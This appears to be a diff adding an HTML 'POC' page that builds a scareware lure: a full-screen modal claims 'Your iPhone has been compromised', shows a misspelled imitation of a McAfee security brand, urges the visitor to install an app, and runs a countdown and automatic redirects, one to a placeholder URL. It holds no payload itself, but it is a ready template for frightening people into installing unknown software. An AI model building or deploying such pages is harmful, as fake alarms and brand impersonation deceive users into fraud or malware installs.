@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <title>POC</title>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="stylesheet" type="text/css" href="./css/style.css" />
+</head>
+<style>
+    @import url('https://fonts.googleapis.com/css2?family=Roboto+Condensed:ital,wght@0,100..900;1,100..900&display=swap');
+</style>
+
+<body>
+    <div class="modalPopup show">
+        <div class="backDrop"></div>
+
+    </div>
+    <div class="modalDialog instal-dialog centerDialog">
+        <div class="modalContent ">
+            <div class="modalHeader">
+                <h1>Your iPhone has been compromised</h1>
+            </div>
+            <div class="modalBody">
+                <div class="instrContent">
+                    <p>
+                        Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has
+                        been
+                        the industry's standard dummy text ever since the 1500s, when an unknown printer took a
+                        galley
+                        of type and scrambled it to make a type specimen book.
+                    </p>
+                    <div class="install-cont">
+                        <div class="logo-icon">
+                            <img src="./img/MCFE-d6ec69dd.png" alt="logo" />
+                        </div>
+                        <p>Install the Mcfee Cyper Security application now to secure your account credentials and
+                            protect your data from further loss.</p>
+                    </div>
+                    <div class="readystartall">
+                        <span id="countdown">01 min 52 sec</span>
+                    </div>
+                </div>
+            </div>
+            <div class="modalFooter">
+                <div class="conbtn leftaction">Delete Account</div>
+                <div class="conbtn rightaction">Install</div>
+            </div>
+        </div>
+    </div>
+    </div>
+    <script src="./js/script.js"></script>
+    <script>
+
+        const focusclr = document.querySelector("rightaction");
+        var timeInSecs;
+        var ticker;
+
+        function startTimer(secs) {
+            timeInSecs = parseInt(secs);
+            ticker = setInterval(tick, 1000);
+        }
+
+        function tick() {
+            var secs = timeInSecs;
+            if (secs > 0) {
+                timeInSecs--;
+            } else {
+                clearInterval(ticker);
+                setTimeout(() => {
+                    setTimeout(() => {
+                        focusclr.style.backgroundColor = '#4258ff24'
+                    }, 2500);
+                    window.location.href = "your_redirect_url_here"; // Replace with your URL
+                }, 4000);
+
+            }
+
+            var mins = Math.floor(secs / 60);
+            secs %= 60;
+
+            var pretty = `${String(mins).padStart(2, '0')} min ${String(secs).padStart(2, '0')} sec`;
+
+            document.getElementById("countdown").innerHTML = pretty;
+        }
+
+        startTimer(2 * 59);
+
+
+
+        const startScan = () => {
+            document.location.href = "./home.html";
+        };
+
+        window.onload = () => {
+            setTimeout(() => {
+                focusclr.style.backgroundColor = '#4258ff24'
+            }, 3000);
+
+            setTimeout(() => {
+                startScan();
+            }, 5000);
+        };
+    </script>
+</body>
+
+</html>
